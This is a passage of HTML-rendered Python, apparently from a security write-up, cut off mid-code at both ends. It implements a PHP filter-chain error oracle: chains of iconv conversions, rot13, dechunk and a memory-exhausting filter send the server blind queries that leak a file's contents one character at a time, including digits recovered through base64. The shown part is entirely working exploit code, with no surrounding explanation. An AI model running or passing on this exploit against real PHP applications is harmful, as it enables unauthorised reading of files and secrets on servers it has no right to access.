+	<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token comment"># i j k</span>
+		<span class="token keyword">if</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+			<span class="token keyword">return</span> <span class="token string">'k'</span>
+		<span class="token keyword">elif</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+			<span class="token keyword">return</span> <span class="token string">'j'</span>
+		<span class="token keyword">elif</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+			<span class="token keyword">return</span> <span class="token string">'i'</span>
+		<span class="token keyword">else</span><span class="token punctuation">:</span>
+			err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span>
+	<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token comment"># I J K</span>
+		<span class="token keyword">if</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+			<span class="token keyword">return</span> <span class="token string">'K'</span>
+		<span class="token keyword">elif</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+			<span class="token keyword">return</span> <span class="token string">'J'</span>
+		<span class="token keyword">elif</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+			<span class="token keyword">return</span> <span class="token string">'I'</span>
+		<span class="token keyword">else</span><span class="token punctuation">:</span>
+			err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span>
+	<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token comment"># v w x</span>
+		<span class="token keyword">if</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+			<span class="token keyword">return</span> <span class="token string">'x'</span>
+		<span class="token keyword">elif</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+			<span class="token keyword">return</span> <span class="token string">'w'</span>
+		<span class="token keyword">elif</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+			<span class="token keyword">return</span> <span class="token string">'v'</span>
+		<span class="token keyword">else</span><span class="token punctuation">:</span>
+			err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span>
+	<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token comment"># V W X</span>
+		<span class="token keyword">if</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+			<span class="token keyword">return</span> <span class="token string">'X'</span>
+		<span class="token keyword">elif</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+			<span class="token keyword">return</span> <span class="token string">'W'</span>
+		<span class="token keyword">elif</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+			<span class="token keyword">return</span> <span class="token string">'V'</span>
+		<span class="token keyword">else</span><span class="token punctuation">:</span>
+			err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span>
+	<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|convert.iconv.CP285.CP280|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token comment"># Z</span>
+		<span class="token keyword">return</span> <span class="token string">'Z'</span>
+	<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token comment"># z</span>
+		<span class="token keyword">return</span> <span class="token string">'z'</span>
+	<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token comment"># M</span>
+		<span class="token keyword">return</span> <span class="token string">'M'</span>
+	<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token comment"># m</span>
+		<span class="token keyword">return</span> <span class="token string">'m'</span>
+	<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|convert.iconv.CP273.CP1122|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token comment"># y</span>
+		<span class="token keyword">return</span> <span class="token string">'y'</span>
+	<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token comment"># Y</span>
+		<span class="token keyword">return</span> <span class="token string">'Y'</span>
+	<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token comment"># l</span>
+		<span class="token keyword">return</span> <span class="token string">'l'</span>
+	<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token comment"># L</span>
+		<span class="token keyword">return</span> <span class="token string">'L'</span>
+	<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token comment"># h</span>
+		<span class="token keyword">return</span> <span class="token string">'h'</span>
+	<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token comment"># H</span>
+		<span class="token keyword">return</span> <span class="token string">'H'</span>
+	<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token comment"># u</span>
+		<span class="token keyword">return</span> <span class="token string">'u'</span>
+	<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token comment"># U</span>
+		<span class="token keyword">return</span> <span class="token string">'U'</span>
+	<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|convert.iconv.CP1390.CSIBM932|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token comment"># g</span>
+		<span class="token keyword">return</span> <span class="token string">'g'</span>
+	<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token comment"># G</span>
+		<span class="token keyword">return</span> <span class="token string">'G'</span>
+	<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token comment"># t</span>
+		<span class="token keyword">return</span> <span class="token string">'t'</span>
+	<span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token comment"># T</span>
+		<span class="token keyword">return</span> <span class="token string">'T'</span>
+	<span class="token keyword">else</span><span class="token punctuation">:</span>
+		err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	prefix <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>header<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>get_nth<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>
+	letter <span class="token operator">=</span> find_letter<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span>
+	<span class="token comment"># it's a number! check base64</span>
+	<span class="token keyword">if</span> letter <span class="token operator">==</span> <span class="token string">'*'</span><span class="token punctuation">:</span>
+		prefix <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>header<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>get_nth<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">|convert.base64-encode'</span></span>
+		s <span class="token operator">=</span> find_letter<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span>
+		<span class="token keyword">if</span> s <span class="token operator">==</span> <span class="token string">'M'</span><span class="token punctuation">:</span>
+			<span class="token comment"># 0 - 3</span>
+			prefix <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>header<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>get_nth<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">|convert.base64-encode|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>r2<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>
+			ss <span class="token operator">=</span> find_letter<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span>
+			<span class="token keyword">if</span> ss <span class="token keyword">in</span> <span class="token string">'CDEFGH'</span><span class="token punctuation">:</span>
+				letter <span class="token operator">=</span> <span class="token string">'0'</span>
+			<span class="token keyword">elif</span> ss <span class="token keyword">in</span> <span class="token string">'STUVWX'</span><span class="token punctuation">:</span>
+				letter <span class="token operator">=</span> <span class="token string">'1'</span>
+			<span class="token keyword">elif</span> ss <span class="token keyword">in</span> <span class="token string">'ijklmn'</span><span class="token punctuation">:</span>
+				letter <span class="token operator">=</span> <span class="token string">'2'</span>
+			<span class="token keyword">elif</span> ss <span class="token keyword">in</span> <span class="token string">'yz*'</span><span class="token punctuation">:</span>
+				letter <span class="token operator">=</span> <span class="token string">'3'</span>
+			<span class="token keyword">else</span><span class="token punctuation">:</span>
+				err<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'bad num (</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ss<span class="token punctuation">&#125;</span></span><span class="token string">)'</span></span><span class="token punctuation">)</span>
+		<span class="token keyword">elif</span> s <span class="token operator">==</span> <span class="token string">'N'</span><span class="token punctuation">:</span>
+			<span class="token comment"># 4 - 7</span>
+			prefix <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>header<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>get_nth<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">|convert.base64-encode|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>r2<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>
+			ss <span class="token operator">=</span> find_letter<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span>
+			<span class="token keyword">if</span> ss <span class="token keyword">in</span> <span class="token string">'CDEFGH'</span><span class="token punctuation">:</span>
+				letter <span class="token operator">=</span> <span class="token string">'4'</span>
+			<span class="token keyword">elif</span> ss <span class="token keyword">in</span> <span class="token string">'STUVWX'</span><span class="token punctuation">:</span>
+				letter <span class="token operator">=</span> <span class="token string">'5'</span>
+			<span class="token keyword">elif</span> ss <span class="token keyword">in</span> <span class="token string">'ijklmn'</span><span class="token punctuation">:</span>
